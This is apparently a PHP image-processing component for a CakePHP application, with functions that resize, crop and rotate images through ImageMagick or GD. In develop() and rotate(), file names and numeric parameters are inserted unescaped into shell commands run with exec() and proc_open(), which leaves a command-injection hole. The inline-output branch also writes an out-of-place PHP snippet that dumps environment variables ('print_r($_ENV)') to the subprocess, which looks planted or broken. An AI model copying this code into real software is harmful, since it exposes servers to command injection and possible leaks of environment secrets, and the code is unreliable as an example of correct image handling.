<?php

class KodakComponent extends Object {
	
	var $controller = true;
	var $components = array('Director');

    function startup (&$controller) {
        $this->controller = &$controller;
    }

	////
	// The workhorse develop function
	////
	function develop($name, $filename, $new_w, $new_h, $quality, $square = false, $gd = null) {
		$old_mask = umask(0);
	
		if (is_null($gd)) {
			if (defined('DIR_GD_VERSION')) {
				$gd = DIR_GD_VERSION;
			} else {
				$gd = $this->gdVersion();
			}
		}
	
		settype($gd, 'integer');
	
		// ImageMagick
		if ($gd >= 3) {
			$info = getimagesize($name); $w = $info[0]; $h = $info[1];
			if ($new_w > $w || $new_h > $h) {
				copy($name, $filename);
				return;
			}
			if ($square) {
				$original_aspect = $w/$h;
				$new_aspect = $new_w/$new_h;
				if ($original_aspect >= $new_aspect) {
					$size_str = 'x' . $new_h;
				} else {
					$size_str = $new_w . 'x';
				}

				$cmd = MAGICK_PATH_FINAL . " \"$name\" -quality $quality -resize $size_str -gravity center -crop {$new_w}x{$new_h}+0+0";
				if ($gd == 4) {
					$cmd .= ' +repage';
				} else {
					$cmd .= ' -page 0+0';
				}
			} else {
				$cmd = MAGICK_PATH_FINAL . " \"$name\" -quality $quality -resize {$new_w}x{$new_h}";
			}

			// Add sharpening
			$cmd .= " -unsharp 1.5x1.2+1.0+0.10";
			
			// Returning inline
			if (is_null($filename)) {
				$cmd .= ' -';
				$descriptorspec = array(
				   0 => array("pipe", "r"),
				   1 => array("pipe", "w"), 
				   2 => array("pipe", "w")
				);
			
				$process = proc_open($cmd, $descriptorspec, $pipes);
				if (is_resource($process)) {
					fwrite($pipes[0], '<?php print_r($_ENV); ?>');
				    fclose($pipes[0]);
				    echo stream_get_contents($pipes[1]);
				    fclose($pipes[1]);
				    $return_value = proc_close($process);
				}
			// Outputting to a file
			} else {
				$cmd .= " \"$filename\"";
				exec($cmd);
			}
		} else {	
			$ext = $this->Director->returnExt($name);	
			// Find out what we are dealing with
			switch(true) {
				case preg_match("/jpg|jpeg|JPG|JPEG/", $ext):
					if (imagetypes() & IMG_JPG) {
						$src_img = imagecreatefromjpeg($name);
						$type = 'jpg';
					} else {
						return;
					}
					break;
				case preg_match("/png/", $ext):
					if (imagetypes() & IMG_PNG) {
						$src_img = imagecreatefrompng($name);
						$type = 'png';
					} else {
						return;
					}
					break;
				case preg_match("/gif|GIF/", $ext):
					if (imagetypes() & IMG_GIF) { 
						$src_img = imagecreatefromgif($name);
						$type = 'gif';
					} else {
						return;
					}
					break;
			}
	
			if (!isset($src_img)) { return; };

			$old_x = imagesx($src_img);
			$old_y = imagesy($src_img);

			$original_aspect = $old_x/$old_y;
			$new_aspect = $new_w/$new_h;

			if ($square) {
				if ($original_aspect >= $new_aspect) {
					$thumb_w = ($new_h*$old_x)/$old_y;
					$thumb_h = $new_h;
					$crop_x = ($thumb_w - $new_w)/2;
					$crop_y = 0;
				} else {
					$thumb_w = $new_w;
					$thumb_h = ($new_w*$old_y)/$old_x;
					$crop_y = ($thumb_h - $new_h)/2;
					$crop_x = 0;
				}
			} else {
			 	$crop_y = 0;
				$crop_x = 0;

				if ($original_aspect >= $new_aspect) {
					if ($new_w > $old_x) {
						copy($name, $filename);
						return;
					}
					$thumb_w = $new_w;
					$thumb_h = ($new_w*$old_y)/$old_x;
				} else { 
					if ($new_h > $old_y) {
					 	copy($name, $filename); 
						return;
					}
					$thumb_w = ($new_h*$old_x)/$old_y;
					$thumb_h = $new_h;
				}
			}

			if ($gd != 2) {
				$dst_img_one = imagecreate($thumb_w, $thumb_h);
				imagecopyresized($dst_img_one, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y);    
			} else {
				$dst_img_one = imagecreatetruecolor($thumb_w,$thumb_h);
				imagecopyresampled($dst_img_one, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y); 
			}        

			if ($square) {
				if ($gd != 2) {
					$dst_img = imagecreate($new_w, $new_h);
					imagecopyresized($dst_img, $dst_img_one, 0, 0, $crop_x, $crop_y, $new_w, $new_h, $new_w, $new_h);    
				} else {
					$dst_img = imagecreatetruecolor($new_w, $new_h);
					imagecopyresampled($dst_img, $dst_img_one, 0, 0, $crop_x, $crop_y, $new_w, $new_h, $new_w, $new_h); 
				}
			} else {
				$dst_img = $dst_img_one;
			}

			if ($type == 'png') {
				imagepng($dst_img, $filename); 
			} elseif ($type == 'gif') {
				imagegif($dst_img, $filename);
			} else {
				imagejpeg($dst_img, $filename, $quality); 
			}

			imagedestroy($dst_img);
			imagedestroy($dst_img_one); 
			imagedestroy($src_img); 
			umask($old_mask);
		}
	}

	////
	// Rotate image
	////
	function rotate($name, $dest, $r){ 
		$old_mask = umask(0);
		$gd = $this->gdVersion();
	
		if ($gd >= 3) {
			$r = -$r;
			$cmd = MAGICK_PATH_FINAL . " \"$name\" -rotate $r \"$dest\"";
			exec($cmd);
		} else {
			$ext = $this->Director->returnExt($name);
			// Find out what we are dealing with
			switch(true) {
				case preg_match("/jpg|jpeg|JPG|JPEG/", $ext):
					if (imagetypes() & IMG_JPG) {
						$src_img = imagecreatefromjpeg($name);
						$type = 'jpg';
					} else {
						return;
					}
					break;
				case preg_match("/png/", $ext):
					if (imagetypes() & IMG_PNG) {
						$src_img = imagecreatefrompng($name);
						$type = 'png';
					} else {
						return;
					}
					break;
				case preg_match("/gif|GIF/", $ext):
					if (imagetypes() & IMG_GIF) { 
						$src_img = imagecreatefromgif($name);
						$type = 'gif';
					} else {
						return;
					}
					break;
			}
	
			if (!isset($src_img)) { return; };

			$new = imagerotate($src_img, $r, 0);

			if ($type == 'png') {
				imagepng($new, $dest); 
		    } elseif ($type == 'gif') {
				imagegif($new, $dest);
			} else {
				imagejpeg($new, $dest, 95); 
			}

			imagedestroy($src_img);
			imagedestroy($new); 
		}
		umask($old_mask);
	}

	////
	// Check GD
	////
	function gdVersion() {
		if (function_exists('exec') && (DS == '/' || (DS == '\\' && MAGICK_PATH_FINAL != 'convert')) && !FORCE_GD) {
			exec(MAGICK_PATH_FINAL . ' -version', $out);
			@$test = $out[0];
			if (!empty($test) && strpos($test, ' not ') === false) {
				$bits = explode(' ', $test);
				$version = $bits[2];
				if (version_compare($version, '6.0.0', '>')) {
					return 4;
				} else {
					return 3;
				}
			} else {
				return $this->_gd();
			}
		} else {
			return $this->_gd();
		}
	}
	
	function _gd() {
		if (function_exists('gd_info')) {
			$gd = gd_info();
			$version = ereg_replace('[[:alpha:][:space:]()]+', '', $gd['GD Version']);
			settype($version, 'integer');
			return $version;
	 	} else {
			return 0;
		}
	}
}

?>